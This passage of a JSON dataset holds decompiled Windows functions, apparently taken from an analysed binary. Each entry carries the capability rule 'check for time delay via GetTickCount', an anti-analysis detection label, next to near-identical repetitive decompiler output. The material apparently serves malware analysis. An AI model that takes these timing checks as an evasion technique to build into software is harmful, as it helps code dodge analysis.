piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3601
    },
    "1400b370": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3700(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106060, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106100, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106120, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106140, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106160, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106180, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3446
    },
    "1400b376": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3760(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106100, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106120, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106140, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106160, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3292
    },
    "1400b37c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b37c0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106120, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106140, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106160, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106180, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  